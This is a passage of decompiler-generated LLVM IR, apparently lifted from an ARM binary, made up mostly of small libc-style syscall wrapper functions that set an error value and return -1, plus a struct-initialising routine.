  %v2_10358 = inttoptr i32 %v0_10350 to i32*
  store i32 %v1_10354, i32* %v2_10358, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10364.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10360

dec_label_pc_10360:                               ; preds = %dec_label_pc_10338, %dec_label_pc_10350
  %v2_10364 = phi i32 [ %v3_10338, %dec_label_pc_10338 ], [ %v2_10364.pre, %dec_label_pc_10350 ]
  %v0_10360 = phi i32 [ %arg1, %dec_label_pc_10338 ], [ -1, %dec_label_pc_10350 ]
  store i32 %v2_10364, i32* @r7, align 4
  ret i32 %v0_10360

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10360, { 1, 0 }
}

define i32 @function_1036c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1036c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1036c = load i32, i32* @r7, align 4
  store i32 %v3_1036c, i32* %stack_var_-8, align 4
  %v0_10378 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10378, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10378, -4095
  br i1 %tmp, label %dec_label_pc_10398, label %dec_label_pc_10388

dec_label_pc_10388:                               ; preds = %dec_label_pc_1036c
  %v0_10388 = call i32 @function_10a30()
  %v0_1038c = load i32, i32* %r7.global-to-local, align 4
  %v1_1038c = sub i32 0, %v0_1038c
  store i32 %v1_1038c, i32* @r3, align 4
  %v2_10390 = inttoptr i32 %v0_10388 to i32*
  store i32 %v1_1038c, i32* %v2_10390, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10398.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10398

dec_label_pc_10398:                               ; preds = %dec_label_pc_1036c, %dec_label_pc_10388
  %v1_1039c = phi i32 [ %v0_10378, %dec_label_pc_1036c ], [ -1, %dec_label_pc_10388 ]
  %v2_10398 = phi i32 [ %v3_1036c, %dec_label_pc_1036c ], [ %v2_10398.pre, %dec_label_pc_10388 ]
  store i32 %v2_10398, i32* @r7, align 4
  ret i32 %v1_1039c

; uselistorder directives
  uselistorder i32 %v0_10378, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10398, { 1, 0 }
}

define i32 @function_103a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_103a0:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103a0 = load i32, i32* @r7, align 4
  store i32 %v3_103a0, i32* %stack_var_-8, align 4
  %v0_103ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_103ac, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_103ac, -4095
  br i1 %tmp, label %dec_label_pc_103cc, label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_103a0
  %v0_103bc = call i32 @function_10a30()
  %v0_103c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_103c0 = sub i32 0, %v0_103c0
  %v2_103c4 = inttoptr i32 %v0_103bc to i32*
  store i32 %v1_103c0, i32* %v2_103c4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_103cc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_103cc

dec_label_pc_103cc:                               ; preds = %dec_label_pc_103a0, %dec_label_pc_103bc
  %v1_103d0 = phi i32 [ %v0_103ac, %dec_label_pc_103a0 ], [ -1, %dec_label_pc_103bc ]
  %v2_103cc = phi i32 [ %v3_103a0, %dec_label_pc_103a0 ], [ %v2_103cc.pre, %dec_label_pc_103bc ]
  store i32 %v2_103cc, i32* @r7, align 4
  ret i32 %v1_103d0

; uselistorder directives
  uselistorder i32 %v0_103ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_103cc, { 1, 0 }
}

define i32 @function_103d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_103d4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_103d4 = load i32, i32* @r7, align 4
  store i32 %v3_103d4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_103fc, label %dec_label_pc_103ec

dec_label_pc_103ec:                               ; preds = %dec_label_pc_103d4
  %v0_103ec = call i32 @function_10a30()
  %v0_103f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_103f0 = sub i32 0, %v0_103f0
  %v2_103f4 = inttoptr i32 %v0_103ec to i32*
  store i32 %v1_103f0, i32* %v2_103f4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10400.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103d4, %dec_label_pc_103ec
  %v2_10400 = phi i32 [ %v3_103d4, %dec_label_pc_103d4 ], [ %v2_10400.pre, %dec_label_pc_103ec ]
  %v0_103fc = phi i32 [ %arg1, %dec_label_pc_103d4 ], [ -1, %dec_label_pc_103ec ]
  store i32 %v2_10400, i32* @r7, align 4
  ret i32 %v0_103fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_103fc, { 1, 0 }
}

define i32 @function_10408(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10408:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10408 = load i32, i32* @r7, align 4
  store i32 %v3_10408, i32* %stack_var_-8, align 4
  %v0_10414 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10414, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10414, -4095
  br i1 %tmp, label %dec_label_pc_10434, label %dec_label_pc_10424

dec_label_pc_10424:                               ; preds = %dec_label_pc_10408
  %v0_10424 = call i32 @function_10a30()
  %v0_10428 = load i32, i32* %r7.global-to-local, align 4
  %v1_10428 = sub i32 0, %v0_10428
  store i32 %v1_10428, i32* @r3, align 4
  %v2_1042c = inttoptr i32 %v0_10424 to i32*
  store i32 %v1_10428, i32* %v2_1042c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10434.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10434

dec_label_pc_10434:                               ; preds = %dec_label_pc_10408, %dec_label_pc_10424
  %v1_10438 = phi i32 [ %v0_10414, %dec_label_pc_10408 ], [ -1, %dec_label_pc_10424 ]
  %v2_10434 = phi i32 [ %v3_10408, %dec_label_pc_10408 ], [ %v2_10434.pre, %dec_label_pc_10424 ]
  store i32 %v2_10434, i32* @r7, align 4
  ret i32 %v1_10438

; uselistorder directives
  uselistorder i32 %v0_10414, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10434, { 1, 0 }
}

define i32 @function_1043c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1043c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_1043c = load i32, i32* @r3, align 4
  store i32 %v9_1043c, i32* %stack_var_-4, align 4
  %v2_10454 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10454, i32* @r3, align 4
  %v0_10478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10478, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10478, -4095
  br i1 %tmp, label %dec_label_pc_10498, label %dec_label_pc_10488

dec_label_pc_10488:                               ; preds = %dec_label_pc_1043c
  %v0_10488 = call i32 @function_10a30()
  %v0_1048c = load i32, i32* %r7.global-to-local, align 4
  %v1_1048c = sub i32 0, %v0_1048c
  store i32 %v1_1048c, i32* @r3, align 4
  %v2_10490 = inttoptr i32 %v0_10488 to i32*
  store i32 %v1_1048c, i32* %v2_10490, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10498

dec_label_pc_10498:                               ; preds = %dec_label_pc_1043c, %dec_label_pc_10488
  %v1_104a4 = phi i32 [ %v0_10478, %dec_label_pc_1043c ], [ -1, %dec_label_pc_10488 ]
  ret i32 %v1_104a4

; uselistorder directives
  uselistorder i32 %v0_10478, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10498, { 1, 0 }
}

define i32 @function_104a8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_104a8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_104e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_104e4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_104e4, -4095
  br i1 %tmp, label %dec_label_pc_10504, label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %dec_label_pc_104a8
  %v0_104f4 = call i32 @function_10a30()
  %v0_104f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_104f8 = sub i32 0, %v0_104f8
  %v2_104fc = inttoptr i32 %v0_104f4 to i32*
  store i32 %v1_104f8, i32* %v2_104fc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10504

dec_label_pc_10504:                               ; preds = %dec_label_pc_104a8, %dec_label_pc_104f4
  %v1_10510 = phi i32 [ %v0_104e4, %dec_label_pc_104a8 ], [ -1, %dec_label_pc_104f4 ]
  ret i32 %v1_10510

; uselistorder directives
  uselistorder i32 %v0_104e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10504, { 1, 0 }
}

define i32 @function_10514(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10514:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10514 = load i32, i32* @r7, align 4
  store i32 %v3_10514, i32* %stack_var_-8, align 4
  %v0_10520 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10520, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10520, -4095
  br i1 %tmp, label %dec_label_pc_10540, label %dec_label_pc_10530

dec_label_pc_10530:                               ; preds = %dec_label_pc_10514
  %v0_10530 = call i32 @function_10a30()
  %v0_10534 = load i32, i32* %r7.global-to-local, align 4
  %v1_10534 = sub i32 0, %v0_10534
  %v2_10538 = inttoptr i32 %v0_10530 to i32*
  store i32 %v1_10534, i32* %v2_10538, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10540.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10540

dec_label_pc_10540:                               ; preds = %dec_label_pc_10514, %dec_label_pc_10530
  %v1_10544 = phi i32 [ %v0_10520, %dec_label_pc_10514 ], [ -1, %dec_label_pc_10530 ]
  %v2_10540 = phi i32 [ %v3_10514, %dec_label_pc_10514 ], [ %v2_10540.pre, %dec_label_pc_10530 ]
  store i32 %v2_10540, i32* @r7, align 4
  ret i32 %v1_10544

; uselistorder directives
  uselistorder i32 %v0_10520, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10540, { 1, 0 }
}

define i32 @function_10548(i32 %arg1) local_unnamed_addr {
dec_label_pc_10548:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10548 = load i32, i32* @r7, align 4
  store i32 %v3_10548, i32* %stack_var_-8, align 4
  %v0_10554 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10554, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10554, -4095
  br i1 %tmp, label %dec_label_pc_10574, label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_10548
  %v0_10564 = call i32 @function_10a30()
  %v0_10568 = load i32, i32* %r7.global-to-local, align 4
  %v1_10568 = sub i32 0, %v0_10568
  %v2_1056c = inttoptr i32 %v0_10564 to i32*
  store i32 %v1_10568, i32* %v2_1056c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10574.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10574

dec_label_pc_10574:                               ; preds = %dec_label_pc_10548, %dec_label_pc_10564
  %v1_10578 = phi i32 [ %v0_10554, %dec_label_pc_10548 ], [ -1, %dec_label_pc_10564 ]
  %v2_10574 = phi i32 [ %v3_10548, %dec_label_pc_10548 ], [ %v2_10574.pre, %dec_label_pc_10564 ]
  store i32 %v2_10574, i32* @r7, align 4
  ret i32 %v1_10578

; uselistorder directives
  uselistorder i32 %v0_10554, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10574, { 1, 0 }
}

define i32 @function_1057c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1057c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_1057c = load i32, i32* @r3, align 4
  store i32 %v9_1057c, i32* %stack_var_-4, align 4
  %v2_10588 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10588, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_105bc, label %dec_label_pc_105ac

dec_label_pc_105ac:                               ; preds = %dec_label_pc_1057c
  %v0_105ac = call i32 @function_10a30()
  %v0_105b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_105b0 = sub i32 0, %v0_105b0
  store i32 %v1_105b0, i32* @r3, align 4
  %v2_105b4 = inttoptr i32 %v0_105ac to i32*
  store i32 %v1_105b0, i32* %v2_105b4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_105bc

dec_label_pc_105bc:                               ; preds = %dec_label_pc_1057c, %dec_label_pc_105ac
  %v0_105bc = phi i32 [ %arg1, %dec_label_pc_1057c ], [ -1, %dec_label_pc_105ac ]
  ret i32 %v0_105bc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_105bc, { 1, 0 }
}

define i32 @function_105d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_105d0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_105d0 = load i32, i32* @r7, align 4
  store i32 %v3_105d0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_105fc, label %dec_label_pc_105ec

dec_label_pc_105ec:                               ; preds = %dec_label_pc_105d0
  %v0_105ec = call i32 @function_10a30()
  %v0_105f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_105f0 = sub i32 0, %v0_105f0
  %v2_105f4 = inttoptr i32 %v0_105ec to i32*
  store i32 %v1_105f0, i32* %v2_105f4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10600.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_105fc

dec_label_pc_105fc:                               ; preds = %dec_label_pc_105d0, %dec_label_pc_105ec
  %v2_10600 = phi i32 [ %v3_105d0, %dec_label_pc_105d0 ], [ %v2_10600.pre, %dec_label_pc_105ec ]
  %v0_105fc = phi i32 [ %arg1, %dec_label_pc_105d0 ], [ -1, %dec_label_pc_105ec ]
  store i32 %v2_10600, i32* @r7, align 4
  ret i32 %v0_105fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_105fc, { 1, 0 }
}

define i32 @function_10608(i32 %arg1) local_unnamed_addr {
dec_label_pc_10608:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10608 = load i32, i32* @r7, align 4
  store i32 %v3_10608, i32* %stack_var_-8, align 4
  %v0_10614 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10614, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10614, -4095
  br i1 %tmp, label %dec_label_pc_10634, label %dec_label_pc_10624

dec_label_pc_10624:                               ; preds = %dec_label_pc_10608
  %v0_10624 = call i32 @function_10a30()
  %v0_10628 = load i32, i32* %r7.global-to-local, align 4
  %v1_10628 = sub i32 0, %v0_10628
  store i32 %v1_10628, i32* @r3, align 4
  %v2_1062c = inttoptr i32 %v0_10624 to i32*
  store i32 %v1_10628, i32* %v2_1062c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10634.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %dec_label_pc_10608, %dec_label_pc_10624
  %v1_10638 = phi i32 [ %v0_10614, %dec_label_pc_10608 ], [ -1, %dec_label_pc_10624 ]
  %v2_10634 = phi i32 [ %v3_10608, %dec_label_pc_10608 ], [ %v2_10634.pre, %dec_label_pc_10624 ]
  store i32 %v2_10634, i32* @r7, align 4
  ret i32 %v1_10638

; uselistorder directives
  uselistorder i32 %v0_10614, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10634, { 1, 0 }
}

define i32 @function_1063c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1063c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1063c = load i32, i32* @r4, align 4
  store i32 %v3_1063c, i32* %stack_var_-24, align 4
  %v9_1063c = load i32, i32* @r6, align 4
  %v12_1063c = load i32, i32* @r7, align 4
  %v15_1063c = load i32, i32* @r8, align 4
  %v18_1063c = load i32, i32* @lr, align 4
  %v2_10640 = load i32, i32* %arg1, align 4
  store i32 %v2_10640, i32* %r4.global-to-local, align 4
  %v3_10648 = icmp eq i32 %v2_10640, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 123764, i32* @r6, align 4
  br i1 %v3_10648, label %dec_label_pc_1065c, label %dec_label_pc_10670

dec_label_pc_1065c:                               ; preds = %dec_label_pc_1063c
  %v0_1065c = call i32 @function_10a30()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_10664 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10664, i32* %r2.global-to-local, align 4
  %v2_10668 = inttoptr i32 %v0_1065c to i32*
  store i32 9, i32* %v2_10668, align 4
  %v0_10710.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10710

dec_label_pc_10670:                               ; preds = %dec_label_pc_1063c
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_10674 = add i32 %tmp, 24
  store i32 %v1_10674, i32* %r4.global-to-local, align 4
  store i32 %v1_10674, i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_10688 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10688)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_106a0 = load i32, i32* @r6, align 4
  %v2_106a0 = add i32 %v0_106a0, 16
  %v3_106a0 = inttoptr i32 %v2_106a0 to i32*
  %v4_106a0 = load i32, i32* %v3_106a0, align 4
  call void @__pseudo_branch(i32 %v4_106a0)
  %v0_106ac = load i32, i32* @r7, align 4
  %v1_106ac = inttoptr i32 %v0_106ac to i32*
  %v2_106ac = load i32, i32* %v1_106ac, align 4
  store i32 %v2_106ac, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_106bc = load i32, i32* @r8, align 4
  store i32 %v0_106bc, i32* %v1_106ac, align 4
  %v0_106c0 = load i32, i32* @r6, align 4
  %v1_106c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_106c0 = add i32 %v1_106c0, %v0_106c0
  %v3_106c0 = inttoptr i32 %v2_106c0 to i32*
  %v4_106c0 = load i32, i32* %v3_106c0, align 4
  store i32 ptrtoint (i32* @global_var_106cc.352 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_106c0)
  %v0_106cc = load i32, i32* @r7, align 4
  %v1_106cc = add i32 %v0_106cc, 12
  %v2_106cc = inttoptr i32 %v1_106cc to i32*
  %v3_106cc = load i32, i32* %v2_106cc, align 4
  store i32 %v3_106cc, i32* @r0, align 4
  %v0_106d0 = call i32 @function_120a4()
  %v0_106d4 = load i32, i32* @r7, align 4
  store i32 %v0_106d4, i32* @r0, align 4
  %v0_106d8 = call i32 @function_120a4()
  %v0_106e0 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_106e0, -4095
  br i1 %tmp11, label %dec_label_pc_1070c, label %dec_label_pc_106fc

dec_label_pc_106fc:                               ; preds = %dec_label_pc_10670
  %v0_106fc = call i32 @function_10a30()
  %v0_10700 = load i32, i32* @r4, align 4
  %v1_10700 = sub i32 0, %v0_10700
  store i32 %v1_10700, i32* %r3.global-to-local, align 4
  %v2_10704 = inttoptr i32 %v0_106fc to i32*
  store i32 %v1_10700, i32* %v2_10704, align 4
  %v0_10708 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %dec_label_pc_10670, %dec_label_pc_106fc
  %v0_1070c = phi i32 [ %v0_106e0, %dec_label_pc_10670 ], [ %v0_10708, %dec_label_pc_106fc ]
  store i32 %v0_1070c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %dec_label_pc_1065c, %dec_label_pc_1070c
  %v0_10710 = phi i32 [ %v0_10710.pre, %dec_label_pc_1065c ], [ %v0_1070c, %dec_label_pc_1070c ]
  %v2_10718 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10718, i32* @r4, align 4
  store i32 %v9_1063c, i32* @r6, align 4
  store i32 %v12_1063c, i32* @r7, align 4
  store i32 %v15_1063c, i32* @r8, align 4
  store i32 %v18_1063c, i32* @lr, align 4
  ret i32 %v0_10710

; uselistorder directives
  uselistorder i32 %v0_106e0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_10710, { 1, 0 }
  uselistorder label %dec_label_pc_1070c, { 1, 0 }
}

define i32 @function_10724(i32 %arg1) local_unnamed_addr {
dec_label_pc_10724:
  %v0_10724 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10724, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10724
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10724, %bb
  %v10_10730 = phi i32 [ %arg1, %dec_label_pc_10724 ], [ 0, %bb ]
  ret i32 %v10_10730

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_10734(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10734:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10734 = load i32, i32* @r5, align 4
  %v9_10734 = load i32, i32* @r6, align 4
  %v12_10734 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_10748 = call i32 @function_11038()
  %v2_10750 = icmp eq i32 %v0_10748, 0
  store i32 123764, i32* @r6, align 4
  br i1 %v2_10750, label %bb, label %dec_label_pc_10760

bb:                                               ; preds = %dec_label_pc_10734
  br label %dec_label_pc_107ec

dec_label_pc_10760:                               ; preds = %dec_label_pc_10734
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10764 = load i32, i32* @r4, align 4
  %v2_10764 = icmp ugt i32 %v0_10764, 511
  %v2_10768 = add i32 %v0_10748, 4
  %v3_10768 = inttoptr i32 %v2_10768 to i32*
  store i32 0, i32* %v3_10768, align 4
  %v0_1076c = load i32, i32* %r3.global-to-local, align 4
  %v2_1076c = add i32 %v0_10748, 16
  %v3_1076c = inttoptr i32 %v2_1076c to i32*
  store i32 %v0_1076c, i32* %v3_1076c, align 4
  %v0_10770 = load i32, i32* %r3.global-to-local, align 4
  %v2_10770 = add i32 %v0_10748, 8
  %v3_10770 = inttoptr i32 %v2_10770 to i32*
  store i32 %v0_10770, i32* %v3_10770, align 4
  br i1 %v2_10764, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10760
  %v0_107782 = load i32, i32* @r4, align 4
  %v2_107783 = add i32 %v0_10748, 20
  %v3_107784 = inttoptr i32 %v2_107783 to i32*
  store i32 %v0_107782, i32* %v3_107784, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10760
  %v1_10774 = load i32, i32* %r3.global-to-local, align 4
  %v2_10774 = add i32 %v1_10774, 512
  store i32 %v2_10774, i32* %r3.global-to-local, align 4
  %v0_10778 = load i32, i32* @r4, align 4
  %v2_10778 = add i32 %v0_10748, 20
  %v3_10778 = inttoptr i32 %v2_10778 to i32*
  store i32 %v0_10778, i32* %v3_10778, align 4
  %v1_1077c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1077c, i32* %v3_10778, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_10748, i32* @r5, align 4
  %v0_10784 = load i32, i32* @r7, align 4
  %v2_10784 = inttoptr i32 %v0_10748 to i32*
  store i32 %v0_10784, i32* %v2_10784, align 4
  %v0_10788 = load i32, i32* @r5, align 4
  %v1_10788 = add i32 %v0_10788, 20
  %v2_10788 = inttoptr i32 %v1_10788 to i32*
  %v3_10788 = load i32, i32* %v2_10788, align 4
  store i32 %v3_10788, i32* %r1.global-to-local, align 4
  %v2_10790 = call i32 @function_11958(i32 1, i32 %v3_10788)
  %v2_10794 = icmp eq i32 %v2_10790, 0
  store i32 %v2_10790, i32* @r4, align 4
  %v1_1079c = load i32, i32* @r5, align 4
  %v2_1079c = add i32 %v1_1079c, 12
  %v3_1079c = inttoptr i32 %v2_1079c to i32*
  store i32 %v2_10790, i32* %v3_1079c, align 4
  br i1 %v2_10794, label %dec_label_pc_107a4, label %dec_label_pc_107b4

dec_label_pc_107a4:                               ; preds = %bb17
  %v0_107a4 = load i32, i32* @r5, align 4
  store i32 %v0_107a4, i32* @r0, align 4
  %v0_107a8 = call i32 @function_120a4()
  %v0_107ac = load i32, i32* @r4, align 4
  br label %dec_label_pc_107ec

dec_label_pc_107b4:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_107dc = load i32, i32* @r5, align 4
  %v1_107dc = add i32 %v0_107dc, 24
  %v1_107e0 = inttoptr i32 %v1_107dc to i32*
  store i32 0, i32* %v1_107e0, align 4
  %v3_107e0 = add i32 %v0_107dc, 28
  %v4_107e0 = inttoptr i32 %v3_107e0 to i32*
  %v5_107e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_107e0, i32* %v4_107e0, align 4
  %v6_107e0 = add i32 %v0_107dc, 32
  %v7_107e0 = inttoptr i32 %v6_107e0 to i32*
  %v8_107e0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_107e0, i32* %v7_107e0, align 4
  %v9_107e0 = add i32 %v0_107dc, 36
  %v10_107e0 = inttoptr i32 %v9_107e0 to i32*
  %v11_107e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_107e0, i32* %v10_107e0, align 4
  %v12_107e0 = add i32 %v0_107dc, 40
  %v2_107e4 = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_107e8 = inttoptr i32 %v12_107e0 to i32*
  store i32 %v2_107e4, i32* %v1_107e8, align 4
  %v3_107e8 = add i32 %v0_107dc, 44
  %v4_107e8 = inttoptr i32 %v3_107e8 to i32*
  %v5_107e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_107e8, i32* %v4_107e8, align 4
  %v0_107ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_107ec

dec_label_pc_107ec:                               ; preds = %bb, %dec_label_pc_107a4, %dec_label_pc_107b4
  %v0_107ec = phi i32 [ 0, %bb ], [ %v0_107ac, %dec_label_pc_107a4 ], [ %v0_107ec.pre, %dec_label_pc_107b4 ]
  store i32 %v6_10734, i32* @r5, align 4
  store i32 %v9_10734, i32* @r6, align 4
  store i32 %v12_10734, i32* @r7, align 4
